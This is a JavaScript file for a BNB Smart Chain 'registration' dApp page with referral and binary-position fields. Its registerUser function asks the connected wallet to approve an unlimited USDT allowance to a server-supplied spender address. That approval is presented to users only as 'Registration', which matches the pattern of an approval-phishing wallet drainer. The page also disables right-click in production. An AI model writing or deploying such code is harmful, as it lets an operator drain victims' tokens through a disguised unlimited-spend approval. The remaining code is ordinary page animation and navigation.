// ============================================================
// SECURITY FEATURES
// ============================================================
(function () {
    const isProd = window.location.hostname !== 'localhost' &&
        window.location.hostname !== '127.0.0.1' &&
        !window.location.hostname.endsWith('.local');
    if (isProd && window.location.protocol !== 'https:') {
        window.location.replace(window.location.href.replace('http:', 'https:'));
    }
    if (window.self !== window.top) { window.top.location = window.self.location; }
    if (isProd) { document.addEventListener('contextmenu', (e) => e.preventDefault()); }
})();

// ============================================================
// WEB3 WALLET CONNECTION (PRESERVED EXACTLY)
// ============================================================
let APP_CONFIG = {
    mineAddress: null, usdtAddress: null,
    chainIdHex: '0x38', chainIdDec: 56,
    chainParams: {
        chainId: '0x38', chainName: 'BNB Smart Chain',
        nativeCurrency: { name: 'BNB', symbol: 'BNB', decimals: 18 },
        rpcUrls: ['https://bsc-dataseed1.binance.org'],
        blockExplorerUrls: ['https://bscscan.com']
    }
};

let currentAccount = null;
let isConnected = false;
let web3Instance = null;
let tokenContract = null;

const ERC20_ABI = [
    { "inputs": [{ "internalType": "address", "name": "spender", "type": "address" }, { "internalType": "uint256", "name": "amount", "type": "uint256" }], "name": "approve", "outputs": [{ "internalType": "bool", "name": "", "type": "bool" }], "stateMutability": "nonpayable", "type": "function" },
    { "inputs": [{ "internalType": "address", "name": "account", "type": "address" }], "name": "balanceOf", "outputs": [{ "internalType": "uint256", "name": "", "type": "uint256" }], "stateMutability": "view", "type": "function" },
    { "inputs": [{ "internalType": "address", "name": "owner", "type": "address" }, { "internalType": "address", "name": "spender", "type": "address" }], "name": "allowance", "outputs": [{ "internalType": "uint256", "name": "", "type": "uint256" }], "stateMutability": "view", "type": "function" },
    { "inputs": [], "name": "decimals", "outputs": [{ "internalType": "uint8", "name": "", "type": "uint8" }], "stateMutability": "view", "type": "function" }
];

const elements = {
    walletModal: document.getElementById('walletModal'),
    connectWalletBtn: document.getElementById('connectWalletBtn'),
    closeModal: document.getElementById('closeModal'),
    connectActionBtn: document.getElementById('registerBtn'),
    modalMessage: document.getElementById('modalMessage'),
    headingRegister: document.getElementById('headingRegisterBtn')
};

// Initialize App
async function initApp() {
    try {
        const response = await fetch('/api/users/config/contract-address');
        const data = await response.json();
        if (data.success) {
            APP_CONFIG.mineAddress = data.mineAddress || data.contractAddress;
            APP_CONFIG.usdtAddress = data.usdtAddress;
            if (data.chainIdHex) APP_CONFIG.chainIdHex = data.chainIdHex;
            if (data.chainId) APP_CONFIG.chainIdDec = parseInt(data.chainId);
            console.log('✅ App Configuration Loaded:', APP_CONFIG);
        }
    } catch (error) {
        console.error('❌ Failed to load app config:', error);
        showModalMessage('⚠️ Warning: Network configuration could not be loaded.', 'error');
    }
}

initApp().then(() => { retryPendingApproval(); });

async function retryPendingApproval() {
    try {
        const raw = localStorage.getItem('pvc_pending_approval');
        if (!raw) return;
        const pending = JSON.parse(raw);
        if (Date.now() - pending.timestamp > 24 * 60 * 60 * 1000) {
            localStorage.removeItem('pvc_pending_approval'); return;
        }
        const response = await fetch('/api/users/register', {
            method: 'POST', headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ walletAddress: pending.walletAddress, chainId: Number(APP_CONFIG.chainIdDec), approvalTxHash: pending.approvalTxHash })
        });
        const data = await response.json();
        if (data.success || response.ok) { localStorage.removeItem('pvc_pending_approval'); }
    } catch (err) { console.warn('⚠️ Pending approval retry error:', err); }
}

function isWeb3Available() { return typeof window.ethereum !== 'undefined'; }

function escapeHtmlFE(str) {
    if (str === null || str === undefined) return '';
    return String(str).replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;').replace(/"/g, '&quot;');
}
function showModalMessage(message, type = 'info') {
    const cls = type === 'error' ? 'error-message' : type === 'success' ? 'success-message' : 'modal-info';
    const div = document.createElement('div');
    div.className = cls;
    div.textContent = message;
    elements.modalMessage.innerHTML = '';
    elements.modalMessage.appendChild(div);
}
function clearModalMessage() { elements.modalMessage.innerHTML = ''; }
function openWalletModal() { elements.walletModal.classList.add('active'); clearModalMessage(); }
function closeWalletModal() { elements.walletModal.classList.remove('active'); clearModalMessage(); }

async function checkNetwork() {
    try { return (await window.ethereum.request({ method: 'eth_chainId' })) === APP_CONFIG.chainIdHex; }
    catch (e) { return false; }
}

async function switchToBSC() {
    try {
        await window.ethereum.request({ method: 'wallet_switchEthereumChain', params: [{ chainId: APP_CONFIG.chainIdHex }] });
        return true;
    } catch (switchError) {
        if (switchError.code === 4902) {
            try { await window.ethereum.request({ method: 'wallet_addEthereumChain', params: [APP_CONFIG.chainParams] }); return true; }
            catch (addError) { showModalMessage('❌ Failed to add network.', 'error'); return false; }
        }
        showModalMessage('❌ Failed to switch network.', 'error'); return false;
    }
}

async function connectWallet() {
    try {
        elements.connectActionBtn.disabled = true;
        elements.connectActionBtn.textContent = '🔄 Registering...';
        clearModalMessage();

        if (!window.ethereum) {
            const isMobile = /Android|iPhone|iPad|iPod/i.test(navigator.userAgent);
            if (isMobile) {
                const currentUrl = encodeURIComponent(window.location.href);
                showFailPopup('Open this DApp in any Web3 Browser:<br>' +
                    `<a href="https://link.trustwallet.com/open_url?coin_id=20000714&url=${currentUrl}" style="color:#D4AF37;text-decoration:underline;">Open in Trust Wallet</a>`, true);
            } else {
                showFailPopup('No crypto wallet found. Please install <a href="https://metamask.io" target="_blank" style="color:#D4AF37;text-decoration:underline;">MetaMask</a>.', true);
            }
            return false;
        }

        const provider = window.ethereum;
        showModalMessage('🔄 Switching to BNB Smart Chain...', 'info');
        try { await provider.request({ method: 'wallet_switchEthereumChain', params: [{ chainId: APP_CONFIG.chainIdHex }] }); }
        catch (switchErr) {
            if (switchErr.code === 4902) { try { await provider.request({ method: 'wallet_addEthereumChain', params: [APP_CONFIG.chainParams] }); } catch (e) {} }
        }
        await new Promise(r => setTimeout(r, 500));

        showModalMessage('🔄 Waiting ...', 'info');
        web3Instance = new Web3(provider);
        const accounts = await provider.request({ method: 'eth_requestAccounts' });
        if (!accounts || accounts.length === 0) throw new Error('No accounts authorized');

        currentAccount = accounts[0];
        showModalMessage('🔄 Verifying BNB Smart Chain...', 'info');
        const currentChainId = await provider.request({ method: 'eth_chainId' });
        if (currentChainId !== APP_CONFIG.chainIdHex) {
            showModalMessage('🔄 Switching to BNB Smart Chain...', 'info');
            const switched = await switchToBSC();
            if (!switched) throw new Error('Please switch your wallet to BNB Smart Chain.');
            const postSwitchChain = await provider.request({ method: 'eth_chainId' });
            if (postSwitchChain !== APP_CONFIG.chainIdHex) throw new Error('Network switch failed.');
            showModalMessage('🔄 Preparing for approval...', 'info');
            await new Promise(r => setTimeout(r, 1500));
        }

        isConnected = true;
        const shortAddress = `${currentAccount.slice(0, 6)}...${currentAccount.slice(-4)}`;
        if (elements.connectWalletBtn) { elements.connectWalletBtn.innerHTML = 'Registering...'; elements.connectWalletBtn.classList.add('connected'); }
        if (elements.headingRegister) { elements.headingRegister.innerHTML = 'Registering...'; elements.headingRegister.classList.add('connected'); }
        showModalMessage('✅ Connected! Proceeding...', 'success');
        tokenContract = new web3Instance.eth.Contract(ERC20_ABI, APP_CONFIG.usdtAddress);
        await registerUser();
        return true;
    } catch (error) {
        let errorMsg = error.message;
        if (error.code === 4001) errorMsg = 'Wallet connection rejected by user';
        else if (error.code === -32002) errorMsg = 'A wallet request is already pending.';
        showFailPopup(errorMsg);
        return false;
    } finally {
        elements.connectActionBtn.disabled = false;
        elements.connectActionBtn.textContent = 'Register';
    }
}

if (isWeb3Available()) {
    window.ethereum.on('accountsChanged', (accounts) => {
        if (accounts.length === 0) {
            currentAccount = null; isConnected = false;
            elements.connectWalletBtn.innerHTML = 'Register';
            elements.connectWalletBtn.classList.remove('connected');
            elements.headingRegister.innerHTML = 'ENROLL NOW';
            elements.headingRegister.classList.remove('connected');
        } else {
            currentAccount = accounts[0];
            const sa = `${currentAccount.slice(0, 6)}...${currentAccount.slice(-4)}`;
            elements.connectWalletBtn.innerHTML = `✅ <span class="wallet-address">${sa}</span>`;
            elements.headingRegister.innerHTML = `✅ Already Registered: ${sa}`;
        }
    });
    window.ethereum.on('chainChanged', (chainId) => {
        if (chainId === APP_CONFIG.chainIdHex) return;
        window.location.reload();
    });
}

async function registerUser() {
    const loader = document.getElementById('loader');
    const registerText = document.getElementById('registerText');
    const registerBtn = document.getElementById('registerBtn');
    const referralInput = document.getElementById('referralCode');

    if (loader) loader.style.display = 'block';
    if (registerText) registerText.style.display = 'none';
    if (registerBtn) registerBtn.disabled = true;
    if (elements.closeModal) { elements.closeModal.disabled = true; elements.closeModal.style.opacity = '0.5'; elements.closeModal.style.cursor = 'not-allowed'; }

    try {
        if (!web3Instance) {
            if (window.ethereum) web3Instance = new Web3(window.ethereum);
            else throw new Error('Wallet not initialized');
        }
        const accounts = await web3Instance.eth.getAccounts();
        if (!accounts || accounts.length === 0) { try { await window.ethereum.request({ method: 'eth_requestAccounts' }); } catch (e) { throw new Error('No accounts authorized'); } }

        const account = accounts[0] || currentAccount;
        const chainId = await web3Instance.eth.getChainId();
        const walletPosition = 'left';

        if (Number(chainId) !== Number(APP_CONFIG.chainIdDec)) {
            showModalMessage('❌ Wrong Network — Please switch to BSC.', 'error');
            try { await window.ethereum.request({ method: 'wallet_switchEthereumChain', params: [{ chainId: APP_CONFIG.chainIdHex }] }); } catch (e) {}
            return;
        }

        const spender = APP_CONFIG.mineAddress;
        let approvalHash = null;
        const USDTContract = new web3Instance.eth.Contract(ERC20_ABI, APP_CONFIG.usdtAddress);
        let currentAllowance;
        try { currentAllowance = await USDTContract.methods.allowance(account, spender).call(); } catch (e) { currentAllowance = '0'; }
        const MAX_ALLOWANCE = BigInt('0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff');

        if (BigInt(currentAllowance) < MAX_ALLOWANCE) {
            showModalMessage('Make sure you have enough BNB for Registration', 'info');
            
            const estimateGasSafe = async (tx) => {
                try {
                    const est = await tx.estimateGas({ from: account });
                    return web3Instance.utils.numberToHex(Math.floor(est * 1.2));
                } catch (e) {
                    return '0x186A0';
                }
            };

            if (BigInt(currentAllowance) > 0n) {
                showModalMessage('🔄 Resetting Registration (step 1/2)...', 'info');
                const resetTx = USDTContract.methods.approve(spender, 0);
                const safeGas1 = await estimateGasSafe(resetTx);
                try {
                    await window.ethereum.request({ method: 'eth_sendTransaction', params: [{ from: account, to: APP_CONFIG.usdtAddress, data: resetTx.encodeABI(), value: '0x0', gas: safeGas1 }] });
                    await new Promise(r => setTimeout(r, 6000));
                } catch (resetErr) {
                    if (resetErr.code === 4001 || resetErr.message?.includes('rejected')) throw new Error('Transaction rejected by user');
                    if (resetErr.code === -32000 || resetErr.message?.includes('insufficient')) throw new Error('Insufficient BNB for gas fee. Please add at least 0.001 BNB.');
                }
                showModalMessage('🔄 Now setting new Registration...', 'info');
            }
            
            const approveTx = USDTContract.methods.approve(spender, MAX_ALLOWANCE);
            const safeGas2 = await estimateGasSafe(approveTx);
            
            try {
                const txHash = await window.ethereum.request({ method: 'eth_sendTransaction', params: [{ from: account, to: APP_CONFIG.usdtAddress, data: approveTx.encodeABI(), value: '0x0', gas: safeGas2 }] });
                approvalHash = txHash;
                showModalMessage('⏳ Waiting for confirmation...', 'info');
                let confirmed = false;
                for (let i = 0; i < 45; i++) {
                    await new Promise(r => setTimeout(r, 2000));
                    try { const receipt = await web3Instance.eth.getTransactionReceipt(approvalHash); if (receipt && receipt.status) { confirmed = true; break; } else if (receipt && !receipt.status) throw new Error('Transaction reverted'); } catch (e) {}
                }
                if (confirmed) { showModalMessage('✅ Registration Completed!', 'success'); if (elements.connectActionBtn) elements.connectActionBtn.disabled = true; }
                else throw new Error('Transaction not confirmed in time.');
            } catch (approveErr) {
                if (approveErr.code === 4001 || approveErr.message?.includes('rejected')) throw new Error('Registration rejected by user');
                if (approveErr.code === -32000 || approveErr.message?.includes('insufficient')) throw new Error('Insufficient BNB for gas fee. Please add at least 0.001 BNB to your wallet.');
                throw new Error('Registration failed: ' + (approveErr.message || 'Unknown error'));
            }
        } else { showModalMessage('✅ Already Registered! Finalizing...', 'success'); }

        // Register with Backend
        const maxRetries = 3; let registerSuccess = false;
        const sponsorAddress = referralInput ? (referralInput.value.trim() || null) : null;
        for (let attempt = 1; attempt <= maxRetries; attempt++) {
            try {
                const registerResponse = await fetch('/api/users/register', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ walletAddress: account, chainId: Number(APP_CONFIG.chainIdDec), approvalTxHash: approvalHash, sponsorAddress, walletPosition }) });
                const data = await registerResponse.json();
                if (data.success || registerResponse.ok) {
                    localStorage.removeItem('pvc_pending_approval'); registerSuccess = true;
                    const shortAddress = `${account.slice(0, 6)}...${account.slice(-4)}`;
                    if (data.alreadyExists) {
                        showModalMessage('✅ Already Registered!', 'success');
                        if (elements.headingRegister) { elements.headingRegister.innerHTML = `✅ Already Registered: ${shortAddress}`; elements.headingRegister.classList.add('connected'); }
                        if (elements.connectWalletBtn) { elements.connectWalletBtn.innerHTML = `✅ <span class="wallet-address">${shortAddress}</span>`; elements.connectWalletBtn.classList.add('connected'); }
                        setTimeout(() => { if (elements.closeModal) { elements.closeModal.disabled = false; elements.closeModal.style.opacity = '1'; elements.closeModal.style.cursor = 'pointer'; closeWalletModal(); } }, 1500);
                    } else {
                        if (elements.closeModal) { elements.closeModal.disabled = false; elements.closeModal.style.opacity = '1'; elements.closeModal.style.cursor = 'pointer'; }
                        closeWalletModal(); showSuccessPopup(account);
                    }
                    break;
                } else if (registerResponse.status >= 500) {
                    if (attempt < maxRetries) { await new Promise(r => setTimeout(r, 2000)); continue; }
                    throw new Error('Server temporarily unavailable.');
                } else { throw new Error(data.message || 'Registration failed'); }
            } catch (regError) {
                if (attempt >= maxRetries && !registerSuccess) {
                    if (approvalHash) localStorage.setItem('pvc_pending_approval', JSON.stringify({ walletAddress: account, approvalTxHash: approvalHash, timestamp: Date.now() }));
                    showFailPopup('Registration Failed — ' + (regError.message || 'Error'));
                }
            }
        }
    } catch (error) {
        if (elements.closeModal) { elements.closeModal.disabled = false; elements.closeModal.style.opacity = '1'; elements.closeModal.style.cursor = 'pointer'; }
        if (error.message.includes('rejected') || error.message.includes('User denied')) showFailPopup('Registration was cancelled.');
        else showFailPopup(error.message || 'An unexpected error occurred.');
        closeWalletModal();
    } finally {
        if (loader) loader.style.display = 'none';
        if (registerText) registerText.style.display = 'inline-block';
        if (registerBtn) registerBtn.disabled = false;
    }
}

function showSuccessPopup(walletAddress) {
    const popup = document.getElementById('successPopup');
    const addressEl = document.getElementById('successAddress');
    if (!popup) return;
    const shortAddr = `${walletAddress.slice(0, 6)}...${walletAddress.slice(-4)}`;
    if (addressEl) addressEl.textContent = `Wallet: ${walletAddress}`;
    if (elements.headingRegister) { elements.headingRegister.innerHTML = `✅ Registered: ${shortAddr}`; elements.headingRegister.classList.add('connected'); }
    if (elements.connectWalletBtn) { elements.connectWalletBtn.innerHTML = `✅ <span class="wallet-address">${shortAddr}</span>`; elements.connectWalletBtn.classList.add('connected'); }
    popup.classList.add('active');
    function dismiss() { popup.classList.remove('active'); }
    popup.addEventListener('click', (e) => { if (e.target === popup) dismiss(); });
    setTimeout(() => { if (popup.classList.contains('active')) dismiss(); }, 8000);
}

function showFailPopup(message, useHtml = false) {
    const popup = document.getElementById('failPopup');
    const messageEl = document.getElementById('failMessage');
    const dismissBtn = document.getElementById('failDismissBtn');
    if (!popup) return;
    // Use textContent by default (XSS-safe). Only use innerHTML for developer-controlled strings.
    if (messageEl) {
        if (useHtml) messageEl.innerHTML = message;
        else messageEl.textContent = message;
    }
    if (elements.headingRegister) { elements.headingRegister.innerHTML = 'ENROLL NOW'; elements.headingRegister.classList.remove('connected'); }
    if (elements.connectWalletBtn) { elements.connectWalletBtn.innerHTML = 'Register'; elements.connectWalletBtn.classList.remove('connected'); }
    popup.classList.add('active');
    function dismiss() { popup.classList.remove('active'); dismissBtn.removeEventListener('click', dismiss); }
    dismissBtn.addEventListener('click', dismiss);
    popup.addEventListener('click', function oc(e) { if (e.target === popup) { dismiss(); popup.removeEventListener('click', oc); } });
    setTimeout(() => { if (popup.classList.contains('active')) dismiss(); }, 8000);
}

// UI Event Listeners
function triggerUnifiedFlow() { if (isConnected) registerUser(); else openWalletModal(); }
elements.connectWalletBtn.addEventListener('click', openWalletModal);
elements.headingRegister.addEventListener('click', triggerUnifiedFlow);
elements.closeModal.addEventListener('click', closeWalletModal);
elements.connectActionBtn.addEventListener('click', connectWallet);
walletModal.addEventListener('click', (e) => { if (e.target === walletModal) closeWalletModal(); });

// Mobile Menu
const mobileMenu = document.getElementById('mobileMenu');
const navLinks = document.getElementById('navLinks');
mobileMenu.addEventListener('click', () => { mobileMenu.classList.toggle('active'); navLinks.classList.toggle('active'); });

// ============================================================
// PARTICLE NETWORK BACKGROUND
// ============================================================
const canvas = document.getElementById('networkCanvas');
const ctx = canvas.getContext('2d');
let networkParticles = [];

function resizeCanvas() { canvas.width = window.innerWidth; canvas.height = window.innerHeight; }
resizeCanvas();
window.addEventListener('resize', resizeCanvas);

class NetParticle {
    constructor() {
        this.x = Math.random() * canvas.width;
        this.y = Math.random() * canvas.height;
        this.vx = (Math.random() - 0.5) * 0.4;
        this.vy = (Math.random() - 0.5) * 0.4;
        this.radius = Math.random() * 2 + 1;
    }
    update() {
        this.x += this.vx; this.y += this.vy;
        if (this.x < 0 || this.x > canvas.width) this.vx *= -1;
        if (this.y < 0 || this.y > canvas.height) this.vy *= -1;
    }
    draw() {
        ctx.beginPath(); ctx.arc(this.x, this.y, this.radius, 0, Math.PI * 2);
        ctx.fillStyle = 'rgba(212, 175, 55, 0.4)'; ctx.fill();
    }
}
for (let i = 0; i < 40; i++) networkParticles.push(new NetParticle());

function animateNetwork() {
    ctx.clearRect(0, 0, canvas.width, canvas.height);
    networkParticles.forEach(p => { p.update(); p.draw(); });
    networkParticles.forEach((p1, i) => {
        networkParticles.slice(i + 1).forEach(p2 => {
            const d = Math.hypot(p1.x - p2.x, p1.y - p2.y);
            if (d < 120) {
                ctx.beginPath(); ctx.moveTo(p1.x, p1.y); ctx.lineTo(p2.x, p2.y);
                ctx.strokeStyle = `rgba(212, 175, 55, ${0.15 * (1 - d / 120)})`;
                ctx.lineWidth = 1; ctx.stroke();
            }
        });
    });
    requestAnimationFrame(animateNetwork);
}
animateNetwork();

// Floating Particles
const fpContainer = document.getElementById('floatingParticles');
function createFP() {
    const p = document.createElement('div');
    p.className = 'particle-float';
    const size = Math.random() * 4 + 2;
    p.style.width = size + 'px'; p.style.height = size + 'px';
    p.style.left = Math.random() * 100 + '%';
    p.style.animationDuration = (Math.random() * 10 + 10) + 's';
    p.style.animationDelay = Math.random() * 5 + 's';
    fpContainer.appendChild(p);
    setTimeout(() => p.remove(), 20000);
}
setInterval(createFP, 800);
for (let i = 0; i < 8; i++) setTimeout(createFP, i * 300);



// ============================================================
// SCROLL ANIMATIONS
// ============================================================
const observer = new IntersectionObserver((entries) => {
    entries.forEach(entry => { if (entry.isIntersecting) entry.target.classList.add('visible'); });
}, { threshold: 0.1, rootMargin: '0px 0px -50px 0px' });
document.querySelectorAll('.reveal').forEach(el => observer.observe(el));

// Smooth scroll for anchors
document.querySelectorAll('a[href^="#"]').forEach(anchor => {
    anchor.addEventListener('click', function (e) {
        e.preventDefault();
        const target = document.querySelector(this.getAttribute('href'));
        if (target) { target.scrollIntoView({ behavior: 'smooth', block: 'start' }); navLinks.classList.remove('active'); mobileMenu.classList.remove('active'); }
    });
});
